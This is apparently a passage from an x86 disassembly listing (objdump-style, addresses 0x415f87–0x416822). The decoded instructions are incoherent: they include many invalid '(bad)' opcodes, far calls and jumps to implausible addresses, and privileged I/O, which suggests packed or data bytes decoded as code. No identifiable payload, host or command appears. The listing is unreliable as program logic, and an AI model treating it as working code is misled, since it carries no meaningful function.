  415f87:	cmp    BYTE PTR [ebx+0x2f6e10b9],ch
  415f8d:	fsub   DWORD PTR [ebp+0x2308303e]
  415f93:	xchg   edi,eax
  415f94:	cwde   
  415f95:	popf   
  415f96:	cmp    ebx,DWORD PTR [ebx]
  415f98:	nop
  415f99:	imul   ebx,DWORD PTR [eax],0xfffffff3
  415f9c:	inc    ebx
  415f9d:	pop    ds
  415f9e:	pop    ebx
  415f9f:	out    dx,eax
  415fa0:	mov    cl,0x3d
  415fa2:	les    ebx,FWORD PTR ds:[ecx+0x33]
  415fa6:	sahf   
  415fa7:	pusha  
  415fa8:	es mov dl,0xa
  415fab:	mov    al,ds:0x89a853d0
  415fb0:	xchg   edi,eax
  415fb1:	je     0x41602f
  415fb3:	jno    0x416019
  415fb5:	add    cl,BYTE PTR [esi-0x6c]
  415fb8:	into   
  415fb9:	imul   ecx,DWORD PTR [edx],0xfd73dbfe
  415fbf:	ret    
  415fc0:	call   0x59b0:0x4387ed66
  415fc7:	scas   al,BYTE PTR es:[edi]
  415fc8:	or     ch,BYTE PTR [edx+0x19]
  415fcb:	rcr    DWORD PTR [edi-0x73],1
  415fce:	xor    BYTE PTR [ebx],ch
  415fd0:	jge    0x415f87
  415fd2:	mov    ah,0x89
  415fd4:	pop    esp
  415fd5:	adc    ah,BYTE PTR [edx-0x8]
  415fd8:	shl    DWORD PTR [edi+0x38d18af7],cl
  415fde:	jecxz  0x416058
  415fe0:	xchg   edi,eax
  415fe1:	retf   
  415fe2:	mov    esp,0xdca91cd9
  415fe7:	mov    eax,ds:0x9f75e74c
  415fec:	xchg   ebx,eax
  415fed:	cmp    BYTE PTR [edx],0x48
  415ff0:	xorps  xmm5,XMMWORD PTR [edi+0x4a5ca565]
  415ff7:	push   ebp
  415ff8:	rol    DWORD PTR [ebx+0x6554870b],0x29
  415fff:	sbb    dh,BYTE PTR ds:0x9f0573e7
  416005:	stc    
  416006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416007:	inc    ecx
  416008:	aam    0xef
  41600a:	cdq    
  41600b:	jle    0x415f9b
  41600d:	inc    ecx
  41600e:	jge    0x415fd5
  416010:	les    ecx,FWORD PTR [esi+eiz*1]
  416013:	push   esp
  416014:	sub    BYTE PTR [esi],dh
  416016:	lahf   
  416017:	aaa    
  416018:	in     eax,dx
  416019:	(bad)  
  41601a:	pop    ss
  41601b:	fwait
  41601c:	mov    cl,0x63
  41601e:	stos   BYTE PTR es:[edi],al
  41601f:	pop    es
  416020:	push   ebp
  416021:	pop    ebx
  416022:	push   ss
  416023:	sbb    eax,0x8e93e2b6
  416028:	fsubp  st(1),st
  41602a:	fidivr WORD PTR [ecx-0x18ba334f]
  416030:	inc    eax
  416031:	dec    ebp
  416032:	pusha  
  416033:	int    0x75
  416035:	shl    ebp,1
  416037:	mov    ecx,0x73b1e3da
  41603c:	jg     0x416035
  41603e:	or     DWORD PTR [edi-0x4f],esp
  416041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416042:	mov    edi,0xa25d2cf5
  416047:	mov    ecx,0xb0ab2b5e
  41604c:	inc    edi
  41604d:	dec    ebp
  41604e:	jmp    0xccb39ec6
  416053:	dec    esp
  416054:	push   ebp
  416055:	sub    al,0x5a
  416057:	out    dx,eax
  416058:	mov    edi,0x27cc0682
  41605d:	sbb    BYTE PTR [esi-0x418cb29c],0x31
  416064:	fild   WORD PTR [edx-0x2bf3c544]
  41606a:	inc    edx
  41606b:	mov    DWORD PTR ds:0xc66ee719,eax
  416071:	fst    st(3)
  416073:	test   al,0x5b
  416075:	in     al,dx
  416076:	dec    esp
  416077:	sub    BYTE PTR [ebx-0x6b6bed6e],cl
  41607d:	sub    edi,edi
  41607f:	inc    DWORD PTR ds:0x6a709194
  416085:	push   edx
  416086:	test   edi,edx
  416088:	push   esi
  416089:	clc    
  41608a:	out    dx,eax
  41608b:	sub    dl,BYTE PTR [ebx-0x7f8aa70]
  416091:	dec    eax
  416092:	imul   ebp,DWORD PTR ds:0x244ce776,0x0
  416099:	out    0xe,eax
  41609b:	inc    eax
  41609c:	sub    bh,BYTE PTR [ebp+eax*8-0x5e3d347]
  4160a3:	(bad)  
  4160a4:	cmp    cl,BYTE PTR [eax+esi*8+0x6]
  4160a8:	push   edx
  4160a9:	and    al,0xbb
  4160ab:	and    DWORD PTR [ebp+0x4cede034],0xb1e3e8d3
  4160b5:	out    dx,al
  4160b6:	(bad)  
  4160b7:	out    dx,eax
  4160b8:	xor    al,0xa8
  4160ba:	(bad)  
  4160bb:	mov    eax,ds:0x131085fb
  4160c0:	push   ecx
  4160c1:	(bad)  
  4160c2:	in     eax,0x1d
  4160c4:	loop   0x416102
  4160c6:	add    al,0x66
  4160c8:	cmp    al,0xb0
  4160ca:	cdq    
  4160cb:	or     BYTE PTR [edx-0x24],bh
  4160ce:	sbb    eax,0x70e3b3f
  4160d3:	inc    ecx
  4160d4:	pop    esi
  4160d5:	push   ds
  4160d6:	fs jne 0x41610b
  4160d9:	and    eax,ebp
  4160db:	pop    esp
  4160dc:	in     al,0x60
  4160de:	ficom  WORD PTR ds:0xc97ce0f4
  4160e4:	shr    BYTE PTR ds:0xb2a67a4f,1
  4160ea:	xchg   esp,eax
  4160eb:	mov    eax,0x30b6222
  4160f0:	es js  0x416094
  4160f3:	shl    BYTE PTR [edi+0x349d32bb],1
  4160f9:	or     al,0xde
  4160fb:	ja     0x4160ec
  4160fd:	fldenv [eax+0x13]
  416100:	inc    esp
  416101:	enter  0x88ee,0xd0
  416105:	add    ah,al
  416107:	popa   
  416108:	jmp    0x4160ac
  41610a:	std    
  41610b:	test   al,0x73
  41610d:	lods   al,BYTE PTR ds:[esi]
  41610e:	fist   WORD PTR [edi-0x19]
  416111:	test   al,0x42
  416113:	(bad)  
  416114:	fisub  WORD PTR [edx+0x22d84539]
  41611a:	adc    eax,0x6c3e3056
  41611f:	retf   0x9ff0
  416122:	test   DWORD PTR [eax-0x759ff2c5],ebp
  416128:	sub    DWORD PTR [edi],esi
  41612a:	(bad)  
  41612b:	shr    BYTE PTR [edx+ebx*4-0x6fef1692],cl
  416132:	not    DWORD PTR [eax+0x65]
  416135:	and    DWORD PTR [ebp-0x12],0x18c883d1
  41613c:	ja     0x4160f8
  41613e:	mov    dh,0xd7
  416140:	mov    esi,0x2636bec9
  416145:	inc    esi
  416146:	ret    
  416147:	imul   eax,DWORD PTR [ebx-0x3727445d],0x7b
  41614e:	xchg   ebx,eax
  41614f:	aaa    
  416150:	fidivr WORD PTR [ebx+0x62]
  416153:	mov    eax,0xf693a1c4
  416158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416159:	push   esi
  41615a:	ja     0x4160fb
  41615c:	lds    esp,FWORD PTR [ecx]
  41615e:	vandnpd ymm4,ymm5,YMMWORD PTR [eax+0x15599b28]
  416166:	jo     0x416119
  416168:	repnz or al,BYTE PTR [ebp+0x18e25797]
  41616f:	imul   eax,DWORD PTR [edx],0x73
  416172:	sub    DWORD PTR [ebp+edi*1-0x138d2e6a],0xaad9a2bc
  41617d:	sti    
  41617e:	retf   
  41617f:	xor    al,0x2e
  416181:	and    DWORD PTR [ecx+0x65],ebp
  416184:	pop    esp
  416185:	ss add al,0xfc
  416188:	and    bh,ch
  41618a:	or     dh,dl
  41618c:	push   esi
  41618d:	cmp    eax,0x347cf800
  416192:	(bad)  
  416193:	mov    cl,0x95
  416195:	mov    WORD PTR [edi-0x20],es
  416198:	sar    DWORD PTR [eax-0x5bad16ad],cl
  41619e:	or     BYTE PTR ds:0xf29e180c,dl
  4161a4:	stc    
  4161a5:	pop    ss
  4161a6:	(bad)  
  4161a7:	mov    eax,ds:0x5e80c1c9
  4161ac:	lds    eax,FWORD PTR [eax-0x64]
  4161af:	dec    edi
  4161b0:	adc    BYTE PTR [esi-0x72],0xe0
  4161b4:	sbb    eax,0x6613c624
  4161b9:	or     DWORD PTR [edi-0x59193541],edi
  4161bf:	jmp    0x416223
  4161c1:	nop
  4161c2:	and    BYTE PTR [esi],0x3b
  4161c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c6:	outs   dx,BYTE PTR ds:[esi]
  4161c7:	push   0x30
  4161c9:	xor    BYTE PTR [eax],dl
  4161cb:	add    ecx,DWORD PTR [edi-0x2e]
  4161ce:	mov    bh,0x9f
  4161d0:	scas   al,BYTE PTR es:[edi]
  4161d1:	nop
  4161d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d3:	or     ah,ah
  4161d5:	fucom  st(2)
  4161d7:	mov    esi,0x9b9dfe83
  4161dc:	adc    BYTE PTR [esp+edi*8+0x41],dl
  4161e0:	rcl    DWORD PTR [edi+esi*8+0x27410e9f],0xf9
  4161e8:	inc    edx
  4161e9:	mov    cl,0x91
  4161eb:	les    esp,FWORD PTR [edx+edi*8]
  4161ee:	jmp    0xfa1e3dba
  4161f3:	and    BYTE PTR [edx-0x516613ec],0x58
  4161fa:	call   FWORD PTR [ecx+ebx*1+0x7f]
  4161fe:	cwde   
  4161ff:	mov    ebx,0x17de7890
  416204:	push   eax
  416205:	mov    ds:0x33483cc6,eax
  41620a:	data16 lock test BYTE PTR [edi+0x79],ch
  41620f:	into   
  416210:	rcr    BYTE PTR [ecx-0x61818ebe],1
  416216:	inc    edx
  416217:	outs   dx,DWORD PTR ds:[esi]
  416218:	test   BYTE PTR [ebp+0x2cb894eb],0xb9
  41621f:	lea    edx,[ecx+0x4b]
  416222:	sahf   
  416223:	mov    DWORD PTR [esi],ebp
  416225:	mov    edi,0x5cf10e6a
  41622a:	ret    0xfacc
  41622d:	fist   DWORD PTR [ebx]
  416230:	sbb    DWORD PTR [ecx-0x18],edi
  416233:	inc    DWORD PTR [esi]
  416235:	sbb    DWORD PTR [ebx+0x7a],ebp
  416238:	retf   
  416239:	sbb    DWORD PTR [eax+0x75c0bcc1],eax
  41623f:	mov    esi,0x923b6eb
  416244:	inc    eax
  416245:	xchg   ebx,eax
  416246:	adc    esi,esp
  416248:	mov    ch,0xff
  41624a:	mov    ds:0x30a014c0,eax
  41624f:	pop    esi
  416250:	jne    0x4161d7
  416252:	shld   DWORD PTR [ebp-0x48],edi,cl
  416256:	gs inc eax
  416258:	es dec ecx
  41625a:	js     0x4161ec
  41625c:	sub    bh,BYTE PTR [eax]
  41625e:	ret    
  41625f:	repz add bl,BYTE PTR [esp+esi*4+0x6a]
  416264:	cmp    al,al
  416266:	jge    0x416240
  416268:	pop    ebp
  416269:	mov    ?,WORD PTR [eax-0x15]
  41626c:	mov    dl,0x7c
  41626e:	mov    ecx,0x8eaac9ec
  416273:	push   cs
  416274:	adc    ch,ah
  416276:	dec    ebx
  416277:	jns    0x4162de
  416279:	mov    ds,eax
  41627b:	xchg   DWORD PTR fs:[ecx-0x554e5829],ecx
  416282:	pop    ecx
  416283:	cmp    ah,0x75
  416286:	ds xor bh,cl
  416289:	pop    es
  41628a:	stc    
  41628b:	out    0xe3,al
  41628d:	sbb    bl,BYTE PTR [eax]
  41628f:	out    0xd0,eax
  416291:	lods   al,BYTE PTR ds:[esi]
  416292:	imul   ebx,DWORD PTR [edi+0x485a348b],0x22479b5d
  41629c:	lods   eax,DWORD PTR ds:[esi]
  41629d:	call   0x80b4:0xc21c43e1
  4162a4:	jecxz  0x416260
  4162a6:	mov    fs,esp
  4162a8:	std    
  4162a9:	pushf  
  4162aa:	dec    ebp
  4162ab:	ins    DWORD PTR es:[edi],dx
  4162ac:	inc    esp
  4162ad:	clc    
  4162ae:	or     edi,DWORD PTR [ecx-0x43]
  4162b1:	sbb    eax,0xd064c19e
  4162b6:	mov    esp,0x462015b9
  4162bb:	retf   
  4162bc:	dec    edi
  4162bd:	sub    cl,BYTE PTR [ebp-0x49]
  4162c0:	int    0x2d
  4162c2:	outs   dx,DWORD PTR ds:[esi]
  4162c3:	sub    DWORD PTR [ebx+0x31749ac4],esi
  4162c9:	mov    edx,0xe06cbe37
  4162ce:	ins    BYTE PTR es:[edi],dx
  4162cf:	(bad)  
  4162d0:	lock or eax,0x4d4fcbfb
  4162d6:	and    al,0x9e
  4162d8:	clc    
  4162d9:	xchg   esp,eax
  4162da:	mov    ebx,0xc2e1bc3
  4162df:	or     ebx,DWORD PTR [ebx]
  4162e1:	mov    edx,0xc94a7ced
  4162e6:	mov    WORD PTR [ebp+0x29c2ed53],ss
  4162ec:	imul   ebp,DWORD PTR [edx],0x709f3734
  4162f2:	mov    BYTE PTR ds:0x5ea318c7,bh
  4162f8:	daa    
  4162f9:	sub    eax,ebp
  4162fb:	imul   ebp,DWORD PTR [ebx],0x2feefd99
  416301:	adc    bh,BYTE PTR [ecx-0x4908439c]
  416307:	push   ebx
  416308:	cmp    ebx,DWORD PTR [esi+0x416234e1]
  41630e:	mov    ecx,0x2b28a48a
  416313:	xchg   edx,eax
  416314:	or     DWORD PTR ds:0x7a903580,esi
  41631a:	enter  0x9327,0xa2
  41631e:	fcmovnbe st,st(7)
  416320:	xchg   esp,eax
  416321:	cmp    DWORD PTR [eax-0x13],ebp
  416324:	shl    BYTE PTR [edx],0x49
  416327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416328:	mov    gs,edx
  41632a:	mov    bl,BYTE PTR [edi-0x5c]
  41632d:	in     al,dx
  41632e:	mov    dh,0x83
  416330:	sahf   
  416331:	fild   DWORD PTR [ebp+0x3d]
  416334:	gs daa 
  416336:	enter  0x534f,0xc3
  41633a:	sub    eax,0xb21485b8
  41633f:	ret    0x9822
  416342:	jno    0x4163b3
  416344:	bound  esi,QWORD PTR [ebx-0x5300d7e2]
  41634a:	xor    al,0x49
  41634c:	mov    ah,0x77
  41634e:	pushf  
  41634f:	iret   
  416350:	hlt    
  416351:	ficom  DWORD PTR [esi-0x3ceed4b2]
  416357:	out    dx,eax
  416358:	jae    0x4163d4
  41635a:	shl    BYTE PTR [eax],1
  41635c:	out    dx,eax
  41635d:	jbe    0x416332
  41635f:	xor    DWORD PTR [edi-0x16],ecx
  416362:	inc    ecx
  416363:	or     al,0xb2
  416365:	pop    ebx
  416366:	push   edx
  416367:	inc    esp
  416368:	adc    ah,BYTE PTR [eax]
  41636a:	sub    DWORD PTR [ecx+0x71793a53],ecx
  416370:	add    ebx,0x6677ecf8
  416376:	arpl   WORD PTR [edx+0x3410d84e],cx
  41637c:	ja     0x41636f
  41637e:	inc    edi
  41637f:	push   eax
  416380:	imul   edx,DWORD PTR [edi],0x31
  416383:	pop    DWORD PTR ds:0x3be30c21
  416389:	jbe    0x41638a
  41638b:	sbb    al,0x71
  41638d:	xchg   esi,eax
  41638e:	(bad)  [edi-0x623ef5c0]
  416394:	fcomp  QWORD PTR [eax+0x425c3061]
  41639a:	not    DWORD PTR [ebx+0x74fda85]
  4163a0:	mov    cl,0x6e
  4163a2:	xor    DWORD PTR [eax-0x6485a2b2],edx
  4163a8:	popa   
  4163a9:	mov    esp,DWORD PTR [esi+0x5a]
  4163ac:	loope  0x4163bd
  4163ae:	inc    edi
  4163af:	out    0x1,eax
  4163b1:	mov    ebp,0x2ae9dded
  4163b6:	test   eax,0xb47b3319
  4163bb:	pop    ecx
  4163bc:	inc    ebx
  4163bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163be:	jb     0x416420
  4163c0:	mov    ah,0xa9
  4163c2:	imul   ecx,DWORD PTR [edx-0x7d2bbcdb],0x23
  4163c9:	rol    eax,1
  4163cb:	pop    edi
  4163cc:	les    ecx,FWORD PTR [ecx]
  4163ce:	dec    edi
  4163cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d0:	aam    0xa4
  4163d2:	pop    ds
  4163d3:	inc    esp
  4163d4:	icebp  
  4163d5:	mov    eax,ds:0xa494a8ac
  4163da:	and    BYTE PTR [ebx+0x65],dh
  4163dd:	es or  dh,dh
  4163e0:	imul   ebp,DWORD PTR [eax],0x53
  4163e3:	jle    0x416455
  4163e5:	jae    0x416380
  4163e7:	leave  
  4163e8:	aad    0x14
  4163ea:	call   0x3fe9:0xbd4dad95
  4163f1:	sub    eax,0xfca484a6
  4163f6:	inc    esi
  4163f7:	mov    bl,0x2c
  4163f9:	jbe    0x41642b
  4163fb:	mov    ds:0xe73c5078,al
  416400:	fistp  DWORD PTR [eax+eax*2-0x31]
  416404:	mov    ch,0x7b
  416406:	out    dx,al
  416407:	call   0x1700:0xf791cbee
  41640e:	shl    DWORD PTR [edx-0x65b1b6c],1
  416414:	sub    DWORD PTR [ebx],ecx
  416416:	ins    BYTE PTR es:[edi],dx
  416417:	mov    ebp,0x5014674d
  41641c:	mov    al,0x1f
  41641e:	aaa    
  41641f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416420:	push   es
  416421:	int3   
  416422:	xchg   edx,eax
  416423:	mov    edi,0x3ef782db
  416428:	out    dx,eax
  416429:	fcmovu st,st(4)
  41642b:	xchg   ebx,eax
  41642c:	inc    BYTE PTR [edx-0x69117179]
  416432:	and    DWORD PTR [edi-0xef467ec],edx
  416438:	add    al,0xc1
  41643a:	push   edi
  41643b:	sub    al,0xcf
  41643d:	sti    
  41643e:	cdq    
  41643f:	(bad)  
  416440:	fdivr  st,st(4)
  416442:	or     eax,0x7a2d27d6
  416447:	iret   
  416448:	add    cl,BYTE PTR [edx]
  41644a:	(bad)  ds:0x3e252d18
  416450:	pop    eax
  416451:	ret    0x60eb
  416454:	dec    esi
  416455:	sahf   
  416456:	and    DWORD PTR [edx-0x4b],edi
  416459:	ret    
  41645a:	in     eax,0xb5
  41645c:	pop    edx
  41645d:	xor    BYTE PTR [edi-0x23cef645],cl
  416463:	dec    ebp
  416464:	mov    eax,0xe995fdcc
  416469:	(bad)
  41646c:	cmp    al,0x69
  41646e:	out    0x8f,al
  416470:	mov    ds:0xb4e2b5ff,al
  416475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416476:	and    BYTE PTR [ebx-0x3c],al
  416479:	inc    eax
  41647a:	pop    esi
  41647b:	outs   dx,DWORD PTR ds:[esi]
  41647c:	(bad)  
  41647d:	(bad)  
  41647e:	iret   
  41647f:	hlt    
  416480:	adc    DWORD PTR [edx],edi
  416482:	ret    
  416483:	push   ebp
  416484:	and    al,0x18
  416486:	(bad)  
  416487:	xlat   BYTE PTR ds:[ebx]
  416488:	ret    0xb95b
  41648b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648c:	jae    0x41641c
  41648e:	ret    0x1e3a
  416491:	cmp    ebx,DWORD PTR [eax]
  416493:	sub    DWORD PTR ss:[ecx+0xc4],edx
	...
  416512:	add    BYTE PTR [eax],al
  416514:	adc    eax,0xfe3de0ab
  416519:	jg     0x4164f8
  41651b:	stos   DWORD PTR es:[edi],eax
  41651c:	mov    esi,DWORD PTR [edi-0x6e4f2fe5]
  416522:	mov    ch,0x1
  416524:	pop    ebx
  416525:	or     DWORD PTR [ecx],eax
  416527:	add    BYTE PTR [ebx+0x7],ch
  41652a:	add    BYTE PTR [eax],al
  41652c:	push   esi
  41652d:	repnz cmp BYTE PTR [esi+0x6f],al
  416531:	pop    ss
  416532:	gs popf 
  416534:	sar    BYTE PTR ds:0x5413ee36,0x3e
  41653b:	xor    DWORD PTR [edi],0x62e6ac0a
  416541:	sub    al,0xfd
  416543:	xor    dh,BYTE PTR [edx-0x1197bfe]
  416549:	jae    0x4165b3
  41654b:	and    eax,0x4ec91770
  416550:	adc    al,0xba
  416552:	xor    eax,0x85f445ea
  416557:	sub    bh,bl
  416559:	loopne 0x4165cd
  41655b:	xchg   edi,eax
  41655c:	mov    ebx,0xe37f4e88
  416561:	add    DWORD PTR [esi+eax*8],esp
  416564:	lds    eax,FWORD PTR [esi]
  416566:	adc    DWORD PTR [ebp+edi*2-0x1b1b1047],edx
  41656d:	mov    eax,0x542dbcd
  416572:	hlt    
  416573:	lock add al,BYTE PTR [ecx-0x1b]
  416577:	das    
  416578:	push   edx
  416579:	cmp    esi,ebp
  41657b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657c:	push   ebx
  41657d:	add    ah,BYTE PTR [edi+ebp*1+0x6f]
  416581:	mov    ebp,0xe7374c02
  416586:	adc    dl,dh
  416588:	jo     0x4165f2
  41658a:	jl     0x416513
  41658c:	mov    ds:0x49f2dfca,eax
  416591:	dec    ebp
  416592:	xchg   ebx,eax
  416593:	jnp    0x416564
  416595:	xor    dl,BYTE PTR [eax-0x6d2a33c2]
  41659b:	sar    BYTE PTR [ebp-0x4],0xf8
  41659f:	jl     0x4165ca
  4165a1:	fldenv [eax-0x2eb0259c]
  4165a7:	sub    DWORD PTR [edx-0x61],0x46
  4165ab:	mov    ecx,0x9d6d0505
  4165b0:	sbb    eax,ebp
  4165b2:	call   0xa812:0x83805531
  4165b9:	test   edx,ebp
  4165bb:	in     eax,0x5a
  4165bd:	xchg   edx,eax
  4165be:	enter  0x781f,0xb9
  4165c2:	cld    
  4165c3:	int    0x8d
  4165c5:	ins    DWORD PTR es:[edi],dx
  4165c6:	mov    ebp,0x2d3b5f58
  4165cb:	loop   0x4165cd
  4165cd:	sub    BYTE PTR [ecx+0x1311be70],al
  4165d3:	retf   0x574c
  4165d6:	and    al,BYTE PTR [esp+esi*2-0x7d275b16]
  4165dd:	cld    
  4165de:	scas   eax,DWORD PTR es:[edi]
  4165df:	inc    esp
  4165e0:	fldenv [eax-0x293a3a15]
  4165e6:	adc    ebp,DWORD PTR [esi]
  4165e8:	add    al,0xe
  4165ea:	mov    bh,0x57
  4165ec:	popf   
  4165ed:	xor    dl,bl
  4165ef:	xchg   DWORD PTR [edx+0x0],esp
  4165f2:	jne    0x4165d8
  4165f4:	and    ecx,ebp
  4165f6:	cmp    dh,bl
  4165f8:	adc    DWORD PTR [esi],ecx
  4165fa:	(bad)  
  4165fc:	cmp    eax,DWORD PTR [edx-0x73fcc8c9]
  416602:	sbb    ah,bl
  416604:	mov    edi,0x53223fae
  416609:	push   ecx
  41660a:	(bad)  
  41660b:	mov    esi,0xc7831cba
  416610:	hlt    
  416611:	pop    es
  416612:	out    0x80,eax
  416614:	sub    DWORD PTR [eax],ebp
  416616:	adc    eax,DWORD PTR [edi+0x65]
  416619:	(bad)  
  41661b:	mov    ds:0xff05157,al
  416620:	jle    0x4165b0
  416622:	inc    DWORD PTR [ebp+0x30]
  416625:	cmp    DWORD PTR ss:[eax],esp
  416628:	aam    0x98
  41662a:	enter  0xe6f9,0x5f
  41662e:	les    edx,FWORD PTR [ebp-0x465d1b43]
  416634:	out    dx,al
  416635:	mov    ds:0x7773696d,eax
  41663a:	mov    ebp,0xb4dd9ba4
  41663f:	gs pop esp
  416641:	ror    DWORD PTR gs:[esi-0x80],cl
  416645:	psubd  mm5,QWORD PTR [edx-0x1c]
  416649:	add    cl,dh
  41664b:	push   0xffffffd0
  41664d:	cmp    BYTE PTR [esi+0x331a5dcf],dl
  416653:	xchg   esp,eax
  416654:	sub    dh,BYTE PTR [edi-0x6a]
  416657:	aaa    
  416658:	fsubr  DWORD PTR [eax-0x76]
  41665b:	sub    DWORD PTR [ecx-0x7d],ecx
  41665e:	js     0x41666d
  416660:	ins    BYTE PTR es:[edi],dx
  416661:	mov    ebx,0xe829c5f9
  416666:	jo     0x416683
  416668:	xor    BYTE PTR [ecx-0x6da84d9],al
  41666e:	add    dl,ch
  416670:	mov    al,ds:0xaa44a6fa
  416675:	push   ecx
  416676:	mov    ch,0x58
  416678:	and    BYTE PTR [ecx+0x77],dh
  41667b:	mov    edx,0x8ac02eda
  416680:	cmp    BYTE PTR ds:0x25ea,bh
  416685:	out    0x88,al
  416687:	lahf   
  416688:	sbb    eax,0x689e1657
  41668d:	dec    ebx
  41668e:	sti    
  41668f:	sbb    eax,0xc4db6b03
  416694:	and    esp,DWORD PTR [esi+ebx*2+0x75bf99c0]
  41669b:	rcl    DWORD PTR [eax+0x3fa50301],0x3d
  4166a2:	dec    edi
  4166a3:	sub    eax,0x3cbb4d52
  4166a8:	dec    edi
  4166a9:	enter  0x5893,0x37
  4166ad:	and    esi,ebp
  4166af:	call   0x7fef84f3
  4166b4:	add    DWORD PTR [esi-0x5de4f4c2],ebx
  4166ba:	aaa    
  4166bb:	adc    BYTE PTR [esi],dl
  4166bd:	pushf  
  4166be:	(bad)  
  4166bf:	dec    ebx
  4166c0:	mov    eax,0x2565e9ec
  4166c5:	jmp    FWORD PTR [ebx-0x7b]
  4166c8:	or     DWORD PTR [ebp-0x4f],ecx
  4166cb:	cwde   
  4166cc:	sbb    al,0x47
  4166ce:	dec    ebp
  4166cf:	dec    eax
  4166d0:	repnz mov dl,0xd6
  4166d3:	adc    al,0xd0
  4166d5:	push   ecx
  4166d6:	inc    edx
  4166d7:	xchg   esi,edx
  4166d9:	daa    
  4166da:	test   eax,0x735aabef
  4166df:	adc    ebp,DWORD PTR [edx]
  4166e1:	jg     0x4166bb
  4166e3:	xchg   edx,eax
  4166e4:	out    0x49,al
  4166e6:	sbb    eax,0xd8efc009
  4166eb:	out    dx,al
  4166ec:	add    al,0xaa
  4166ee:	mov    dh,0xac
  4166f0:	xor    eax,0xb1c39c1b
  4166f5:	adc    bl,ah
  4166f7:	loop   0x416767
  4166f9:	mov    es,WORD PTR [edx+0x50895f52]
  4166ff:	jo     0x416773
  416701:	xlat   BYTE PTR ds:[ebx]
  416702:	iret   
  416703:	push   0x51
  416705:	push   ds
  416706:	push   0x1f
  416708:	or     ecx,DWORD PTR [ebp+0x8bb611f]
  41670e:	dec    dl
  416710:	push   0x55c1002f
  416715:	and    ah,BYTE PTR ds:0xe7760510
  41671b:	push   esp
  41671c:	pop    eax
  41671d:	and    esi,DWORD PTR [ebp-0x55]
  416720:	nop
  416721:	popf   
  416722:	(bad)  
  416723:	idiv   BYTE PTR [esi+0x1d]
  416726:	mov    edx,0x52505fa5
  41672b:	add    DWORD PTR [eax],ebx
  41672d:	mov    ch,0x93
  41672f:	imul   DWORD PTR [ebp+0x2b0fed0b]
  416735:	enter  0xe67b,0xe0
  416739:	test   bh,cl
  41673b:	pop    ecx
  41673c:	mov    ah,0x97
  41673e:	mov    cl,0x4
  416740:	add    BYTE PTR [ebp+0x59],0x88
  416744:	shl    DWORD PTR [ebx+0x59e5e28b],cl
  41674a:	push   edi
  41674b:	outs   dx,BYTE PTR cs:[esi]
  41674d:	adc    eax,0x5aa8343c
  416752:	add    DWORD PTR [esi-0xa],ebx
  416755:	test   eax,0xb0139efe
  41675a:	shr    DWORD PTR [edi-0x53],cl
  41675d:	lock inc ebp
  41675f:	jo     0x4167cc
  416761:	adc    edx,DWORD PTR [esi]
  416763:	jo     0x4166ea
  416765:	push   ss
  416766:	pop    ebp
  416767:	mov    ebx,0xca47c5d9
  41676c:	in     eax,0xa8
  41676e:	cmp    edx,edx
  416770:	dec    esp
  416771:	and    ch,bl
  416773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416774:	cmp    ecx,DWORD PTR [ebx]
  416776:	add    ah,BYTE PTR [edi-0x2e]
  416779:	xchg   ebx,eax
  41677a:	xchg   BYTE PTR [eax+0x14],dh
  41677d:	and    eax,0xf7919c92
  416782:	fidivr WORD PTR [ecx]
  416784:	inc    ebx
  416785:	adc    ebp,DWORD PTR [ecx+0x1c]
  416788:	int3   
  416789:	inc    edi
  41678a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41678b:	fidiv  WORD PTR [ebp+esi*4+0x7ebcf605]
  416792:	imul   edi,DWORD PTR [ebx],0xffffffb4
  416795:	adc    ecx,ebx
  416797:	lahf   
  416798:	ret    
  416799:	cmp    ecx,edi
  41679b:	or     edx,DWORD PTR [ecx]
  41679d:	test   al,0xef
  41679f:	mov    edi,0xe9834da6
  4167a4:	ins    BYTE PTR es:[edi],dx
  4167a5:	xor    ebx,DWORD PTR [eax-0x3f21d761]
  4167ab:	mov    edx,0x5f9d97cb
  4167b0:	push   edi
  4167b1:	in     eax,dx
  4167b2:	loop   0x416749
  4167b4:	cmp    ebx,esi
  4167b6:	lahf   
  4167b7:	jle    0x41677b
  4167b9:	sbb    ah,BYTE PTR [edx-0x2d]
  4167bc:	fnstsw WORD PTR ds:0x8bb1fbeb
  4167c2:	shr    BYTE PTR [esi],0x70
  4167c5:	rol    ecx,cl
  4167c7:	stc    
  4167c8:	les    ebp,FWORD PTR [ebx-0x5e842bff]
  4167ce:	dec    edi
  4167cf:	scas   al,BYTE PTR es:[edi]
  4167d0:	inc    esi
  4167d1:	lahf   
  4167d2:	add    DWORD PTR [eax],ebp
  4167d4:	retf   
  4167d5:	arpl   WORD PTR [edx-0x50cd3221],si
  4167db:	loope  0x416779
  4167dd:	cdq    
  4167de:	lahf   
  4167df:	fadd   QWORD PTR ds:0x9005972
  4167e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e6:	cmp    BYTE PTR ds:0x5cad5f81,al
  4167ec:	outs   dx,BYTE PTR ds:[esi]
  4167ed:	mov    ah,0x41
  4167ef:	imul   esi,ecx,0x13e6c146
  4167f5:	cli    
  4167f6:	inc    ebx
  4167f7:	das    
  4167f8:	mov    esi,0xcbec5920
  4167fd:	(bad)  
  4167fe:	lock add al,0x37
  416801:	mov    eax,gs:0x60f31743
  416807:	ret    
  416808:	std    
  416809:	(bad)  [eax]
  41680b:	inc    edi
  41680c:	in     al,dx
  41680d:	out    0xcc,eax
  41680f:	mov    DWORD PTR [ebp+0x19],edx
  416812:	xor    BYTE PTR [edi-0x52],0x3b
  416816:	aam    0x65
  416818:	cmp    ebp,ebx
  41681a:	and    DWORD PTR [ebx+ebp*1+0x115b7a6a],esi
  416821:	inc    ebp
  416822:	fcomp  QWORD PTR es:[ebx-0x50dd89fe]
